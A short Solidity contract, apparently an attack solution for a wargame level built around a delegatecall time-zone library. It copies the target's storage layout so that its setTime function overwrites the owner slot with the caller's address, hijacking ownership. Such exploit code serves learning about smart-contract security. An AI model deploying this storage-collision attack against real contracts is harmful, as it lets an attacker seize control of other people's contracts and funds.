// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract Aack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _owner) external {
        owner = msg.sender;
    }
}
